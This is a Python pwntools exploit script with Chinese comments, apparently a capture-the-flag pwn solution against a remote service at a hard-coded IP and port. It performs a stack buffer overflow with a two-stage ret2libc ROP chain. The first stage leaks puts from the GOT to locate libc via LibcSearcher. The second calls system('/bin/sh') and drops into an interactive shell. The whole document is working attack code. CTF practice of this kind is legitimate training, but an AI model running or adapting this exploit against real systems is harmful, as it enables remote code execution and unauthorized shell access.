from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
context.log_level = 'debug'

binary_file = './pwn' 
elf = ELF(binary_file)

# --- 修正点开始 ---
# 因为 binary 被 stripped (去符号)，无法自动找到 main，需手动指定
# 根据题目描述：main .text 000000000040120C
main_addr = 0x40120C 
# --- 修正点结束 ---

# 远程连接
ip = '20.168.118.182'
port = 31230
io = remote(ip, port)

# 如果 plt 表也找不到，可以使用硬编码地址，但通常 pwntools 能解析 plt
try:
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
except:
    # 如果 plt/got 也报错，请根据题目反汇编手动填入地址
    # _puts .plt.sec 0000000000401060
    puts_plt = 0x401060
    # got 表通常在 .got.plt 段，需要用 objdump -R ./pwn 查看，或者信赖 pwntools
    puts_got = elf.got['puts'] 

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

offset = 18

# Stage 1: 泄露 Libc
log.info("Starting Stage 1: Leak Libc address")
payload1 = flat([
    b'A' * offset,
    pop_rdi,
    puts_got,
    puts_plt,
    main_addr  # 返回 main 重新利用
])

io.recvuntil(b"input something")
io.sendline(payload1)

leak_data = io.recvline().strip()
leak_addr = u64(leak_data.ljust(8, b'\x00'))
log.success(f"Leaked puts address: {hex(leak_addr)}")

# Stage 2
libc = LibcSearcher('puts', leak_addr)
libc_base = leak_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

log.success(f"Libc Base: {hex(libc_base)}")

payload2 = flat([
    b'A' * offset,
    pop_rdi,
    binsh_addr,
    ret,       # 栈对齐
    system_addr
])

io.recvuntil(b"input something")
io.sendline(payload2)

io.interactive()
